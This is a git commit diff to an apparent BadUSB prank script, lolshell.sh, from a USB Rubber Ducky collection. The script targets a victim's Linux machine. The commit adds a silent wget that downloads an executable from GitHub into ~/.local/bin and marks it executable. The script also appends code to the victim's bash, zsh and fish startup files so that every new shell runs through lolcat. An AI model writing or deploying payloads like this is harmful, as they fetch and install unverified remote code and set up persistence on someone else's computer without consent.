4254082ebf916b6ec10b7ceb22cb76c45844197a
FalsePhilosopher <joshgarland90@gmail.com>
2025-05-14 17:33:50 -0600

    Added lolcat

--- Ducky/USBRubberducky/prank/Unix-like/Linux/Painbow/lolshell.sh
+++ Ducky/USBRubberducky/prank/Unix-like/Linux/Painbow/lolshell.sh
@@ -1,20 +1,25 @@
 #!/bin/bash
 
+if ! command -v lolcat &> /dev/null; then
+    wget -qO "$HOME/.local/bin/lolcat" https://github.com/FalsePhilosopher/BadUSB-Playground/raw/refs/heads/main/Ducky/USBRubberducky/prank/Unix-like/Linux/Painbow/lolcat
+    chmod +x "$HOME/.local/bin/lolcat"
+fi
+
 echo '
 if [[ -t 1 && -z "$LOLBASH" ]]; then
     export LOLBASH=1
-    exec script -qfc "bash" /dev/null | lolcat
+    exec bash |& lolcat
 fi' >> ~/.bashrc
 
 echo '
 if [[ -t 1 && -z "$LOLZSH" ]]; then
-    export LOLZSH=1
-    exec script -qfc "zsh" /dev/null | lolcat
+  export LOLZSH=1
+  exec zsh |& lolcat
 fi' >> ~/.zshrc
 
 echo '
 if test -t 1; and not set -q LOLFISH
     set -Ux LOLFISH 1
-    script -qfc "fish" /dev/null | lolcat; exit
+    exec fish |& lolcat; exit
 end' >> ~/.config/fish/config.fish
 
